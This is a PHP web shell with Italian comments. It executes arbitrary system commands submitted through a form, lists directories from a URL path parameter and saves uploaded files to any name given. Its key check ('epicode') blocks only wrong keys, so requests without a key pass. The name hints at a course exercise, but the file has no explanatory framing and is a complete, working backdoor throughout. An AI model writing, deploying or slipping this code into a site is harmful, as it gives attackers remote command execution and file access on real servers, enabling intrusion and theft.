<?php
// Protezione: cambio URL se richiesto
if (isset($_GET['key']) && $_GET['key'] !== 'epicode') {
    die('Access denied');
}

// Esegui comandi
if (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}

// Funzione per navigare nel file system
if (isset($_GET['action']) && $_GET['action'] === 'ls') {
    $dir = isset($_GET['path']) ? $_GET['path'] : '.';
    echo "<pre>";
    foreach (scandir($dir) as $file) {
        echo $file . "\n";
    }
    echo "</pre>";
}

// Caricamento file
if (isset($_FILES['file']['tmp_name'])) {
    $target = $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "File uploaded to: " . realpath($target);
}

// Modulo interattivo
?>
<html>
    <body>
        <form method="post">
            <input type="text" name="cmd" placeholder="Command" />
            <button type="submit">Execute</button>
        </form>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" />
            <button type="submit">Upload</button>
        </form>
        <a href="?action=ls">List Files</a>
    </body>
</html>
